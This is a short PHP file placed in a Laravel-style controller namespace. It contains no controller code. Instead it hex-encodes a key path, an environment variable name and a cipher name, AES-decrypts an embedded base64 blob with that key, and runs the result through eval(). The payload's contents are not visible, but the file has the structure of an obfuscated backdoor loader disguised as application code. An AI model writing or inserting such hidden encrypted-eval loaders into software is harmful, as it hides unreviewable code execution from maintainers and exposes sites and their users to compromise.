<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('QJXX1kSKWyOWaWD3lgm17A==');

$c=base64_decode(

'XIEg+YVa4FOKh65Ph+NnGQMX2oph9RbKNsQ+0QF2XBHuArAw/AcgnB9NAzKIY/ZDqMY1MhStMc8k' .
'8XBOeub5QkF64ps/q7ii14gIIT6j9V132AWsLY3KfvF74OyYnpAZn5sgcfpeJbDZOmDCcqbizcpA' .
'RYzB9KOyIItJ2BCm02j1X3O8CLvFqYVdZhqYSdGl+1FXtPCkpThlRtAlPpttXwRtw3xeeGqX7gO8' .
'HQRAXn88bKERKatCkWzKeJEQaWvfvX1YUREepnB5i2U2n3w4l8hz2uzxGLaz39vHkX3i3X9bS3Vz' .
'14F8H/U75B47S58AiiZs4DfX7FZAk5YAuiY196QMhs8LvK8W9CUlv/TovQU9kCxXmQYivsfggIr2' .
'JJ6oHef2K0cPjhdVJnCioXXENg=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

